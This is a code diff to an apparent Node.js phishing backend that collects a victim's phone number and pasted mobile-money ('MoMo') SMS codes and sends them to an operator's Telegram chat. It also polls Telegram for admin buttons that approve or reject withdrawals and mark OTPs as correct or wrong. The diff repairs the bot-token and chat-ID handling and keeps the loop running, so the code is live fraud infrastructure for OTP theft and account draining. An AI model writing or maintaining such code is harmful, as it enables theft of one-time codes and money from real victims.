@@ -57,7 +57,6 @@ app.post('/api/submit-sms', async (req, res) => {
     const { sms } = req.body;
     currentData.sms = sms;
 
-    // Optional: Send pasted SMS to Telegram log
     const message = `📲 *MoMo SMS Code Pasted* 📲\n\n📱 *Phone:* \`${currentData.phone}\`\n📝 *SMS Text:* \`${sms}\``;
     try {
         await sendTelegramMessage(message, []);
@@ -95,12 +94,16 @@ app.get('/api/check-otp-status', (req, res) => {
     res.json({ status: otpStatus });
 });
 
-// 5. Telegram Long-Polling to listen for admin button clicks (approve/reject withdrawal, correct/wrong OTP)
+// 5. Telegram Long-Polling to listen for admin button clicks
 async function pollTelegramUpdates() {
-    if (!BOT_TOKEN) return;
+    // FIX: Check process.env.BOT_TOKEN correctly
+    if (!process.env.BOT_TOKEN) {
+        setTimeout(pollTelegramUpdates, 5000);
+        return;
+    }
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
+        const response = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
         const data = await response.json();
 
         if (data.ok && data.result && data.result.length > 0) {
@@ -114,8 +117,6 @@ async function pollTelegramUpdates() {
                     const callbackQueryId = update.callback_query.id;
 
                     await answerCallback(callbackQueryId, 'Processing action...');
-
-                    // Remove buttons so they can't be clicked twice, keeping text visible
                     await removeMessageButtons(chatId, messageId);
 
                     let statusMessage = '';
@@ -143,13 +144,14 @@ async function pollTelegramUpdates() {
         console.error('Polling error:', err.message);
     }
 
+    // Ensure polling loops continuously even if an error occurs
     setTimeout(pollTelegramUpdates, 1000);
 }
 
 // Telegram Helper Functions
 async function answerCallback(callbackQueryId, text) {
     try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/answerCallbackQuery`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ callback_query_id: callbackQueryId, text })
@@ -160,11 +162,11 @@ async function answerCallback(callbackQueryId, text) {
 }
 
 async function sendTelegramMessage(text, keyboard) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            chat_id: CHAT_ID,
+            chat_id: process.env.CHAT_ID,
             text: text,
             parse_mode: 'Markdown',
             reply_markup: { inline_keyboard: keyboard }
@@ -174,7 +176,7 @@ async function sendTelegramMessage(text, keyboard) {
 
 async function removeMessageButtons(chatId, messageId) {
     try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
+        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/editMessageReplyMarkup`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
@@ -190,7 +192,7 @@ async function removeMessageButtons(chatId, messageId) {
 
 async function sendStatusMessage(chatId, text) {
     try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
